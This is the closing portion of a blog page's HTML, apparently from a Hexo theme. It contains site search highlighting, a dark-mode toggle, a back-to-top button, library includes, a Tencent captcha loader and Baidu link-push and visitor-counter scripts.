                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
        
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura-reduce.js"><\/script>');
            }
        </script>
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
